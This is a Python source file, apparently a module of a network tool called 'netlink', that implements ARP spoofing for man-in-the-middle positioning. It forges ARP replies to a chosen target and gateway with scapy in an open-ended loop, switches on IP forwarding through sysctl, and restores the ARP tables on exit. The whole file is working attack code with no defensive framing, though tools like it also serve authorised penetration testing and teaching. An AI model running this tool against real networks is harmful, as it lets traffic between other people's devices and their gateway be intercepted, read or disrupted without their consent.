"""
Author: Chris Martinez
Date: 25 May 2026
Version: 1.0.0
Name: __init__.py (arp_spoof)
Description: 
"""
import argparse
import itertools
import platform
import subprocess
import signal
import sys
import time

from scapy.all import get_if_hwaddr, sendp
from scapy.layers.l2 import Ether, ARP, getmacbyip
from types import FrameType

from netlink.core.base_module import BaseModule
from netlink.core.output import OutputManager


class ARPSpoofer(BaseModule):
    """
    
    """
    ############################################################################
    # Class Level Attributes
    ############################################################################
    NAME = "arp_spoof"
    DESCRIPTION = "Perform ARP poisoning for MITM positioning"
    REQUIRES_ROOT = True

    ARP_REQUEST = 1
    ARP_REPLY = 2
    BROADCAST = "ff:ff:ff:ff:ff:ff"

    
    ############################################################################
    # Constructor
    ############################################################################
    def __init__(self, iface: str, output: OutputManager):
        super().__init__(iface, output)
        self.keyboard_interrupted = False
        self.LINUX = False
        self.MAC = False
        self._determine_OS()

    ############################################################################
    # Methods
    ############################################################################
    def add_args(self, parser: argparse.ArgumentParser) -> None:
        """
        
        """
        parser.add_argument(
            '-c',
            '--count',
            type=int,
            action='store',
            dest='count',
            default=0,
            help="Number of packets to send (Default=0 infinite)"
        )

        parser.add_argument(
            '--interval',
            type=float,
            action='store',
            dest='interval',
            default=2.0,
            help="The interval of N seconds between packets sent (Dafault=2)"
        )

        parser.add_argument(
            '-t',
            '--target',
            type=str,
            action='store',
            dest='target',
            required=True,
            help="The IP of the target to ARP spoof"
        )

        parser.add_argument(
            '-g',
            '--gateway',
            type=str,
            action='store',
            dest='gateway',
            required=True,
            help="The IP of the gateway for your ARP spoof"
        )

        parser.add_argument(
            '--disable-ip-forward',
            action='store_true',
            dest='disable_ip_forward',
            default=False,
            help="Disables automatic IP forwarding"
        )

        parser.add_argument(
            '--one-way',
            action='store_true',
            dest='one_way',
            default=False,
            help="Only spoofs the victim, not the gateway"
        )

    def run(self, args: argparse.Namespace) -> None:
        """
        
        """
        my_mac = get_if_hwaddr(self.iface)
        target_mac = getmacbyip(args.target)
        gateway_mac = getmacbyip(args.gateway)

        if my_mac == None or target_mac == None or gateway_mac == None:
            msg = f"Error attempting to grab MAC Addresses"
            self.output.error(msg)
            sys.exit(1)

        self.keyboard_interrupted = False
        signal.signal(signal.SIGINT, self._sigint_handler)
        counter = range(args.count) if args.count > 0 else itertools.count()
        enable_ip_forward = False if args.disable_ip_forward else True

        if enable_ip_forward:
            self._enable_ip_forwarding()

        try:
            for _ in counter:
                if self.keyboard_interrupted:
                    break
                self._poison(my_mac, target_mac, gateway_mac, args)
                time.sleep(args.interval)
        except Exception as e:
            self.output.warn(f"{e}")
        finally:
            if enable_ip_forward:
                self._disable_ip_forwarding()
            self._restore_arp_tables(my_mac, target_mac, gateway_mac, args)
            signal.signal(signal.SIGINT, signal.SIG_DFL)
                
    def validate_args(self, args: argparse.Namespace) -> bool:
        """
        
        """
        return True
    
    def _determine_OS(self) -> None:
        """
        
        """
        system_os = platform.system()
        if system_os == 'Linux':
            self.LINUX = True
        elif system_os == 'Darwin':
            self.MAC = True
        else:
            msg = "You need to be on a valid Linux Distro or Mac OS system"
            self.output.error(msg)
            sys.exit(1)
    
    def _enable_ip_forwarding(self) -> None:
        """
        
        """
        LINUX_CMD = ['sysctl', '-w', 'net.ipv4.ip_forward=1']
        MAC_CMD = ['sysctl', '-w', 'net.inet.ip.forwarding=1']

        if self.LINUX:
            subprocess.run(LINUX_CMD)
        elif self.MAC:
            subprocess.run(MAC_CMD)
    
    def _disable_ip_forwarding(self) -> None:
        """
        
        """
        LINUX_CMD = ['sysctl', '-w', 'net.ipv4.ip_forward=0']
        MAC_CMD = ['sysctl', '-w', 'net.inet.ip.forwarding=0']

        if self.LINUX:
            subprocess.run(LINUX_CMD)
        elif self.MAC:
            subprocess.run(MAC_CMD)

    def _poison(self, 
                my_mac: str,
                target_mac: str,
                gateway_mac: str,
                args: argparse.Namespace) -> None:
        """
        
        """
        spoof_gateway = False if args.one_way else True

        pkt_to_victim = Ether(
            dst=target_mac, 
            src=my_mac
        )

        pkt_to_victim /= ARP(
            op=self.ARP_REPLY, 
            hwsrc=my_mac,
            psrc=args.gateway,
            hwdst=target_mac,
            pdst=args.target
        )

        sendp(pkt_to_victim, iface=self.iface, verbose=0)

        if spoof_gateway:
            pkt_to_gateway = Ether(
                dst=gateway_mac,
                src=my_mac
            )

            pkt_to_gateway /= ARP(
                op=self.ARP_REPLY,
                hwsrc=my_mac,
                psrc=args.target,
                hwdst=gateway_mac,
                pdst=args.gateway
            )

            sendp(pkt_to_gateway, iface=self.iface, verbose=0)

    def _restore_arp_tables(self, 
                my_mac: str,
                target_mac: str,
                gateway_mac: str,
                args: argparse.Namespace) -> None:
        """
        
        """
        spoof_gateway = False if args.one_way else True

        pkt_to_victim = Ether(
            dst=target_mac, 
            src=gateway_mac
        )

        pkt_to_victim /= ARP(
            op=self.ARP_REPLY, 
            hwsrc=gateway_mac,
            psrc=args.gateway,
            hwdst=target_mac,
            pdst=args.target
        )

        sendp(pkt_to_victim, iface=self.iface, verbose=0, count=5)

        if spoof_gateway:
            pkt_to_gateway = Ether(
                dst=gateway_mac,
                src=target_mac
            )

            pkt_to_gateway /= ARP(
                op=self.ARP_REPLY,
                hwsrc=target_mac,
                psrc=args.target,
                hwdst=gateway_mac,
                pdst=args.gateway
            )

            sendp(pkt_to_gateway, iface=self.iface, verbose=0, count=5)

    def _sigint_handler(self, sig: int, frame: FrameType|None) -> None:
        """
        
        """
        self.keyboard_interrupted = True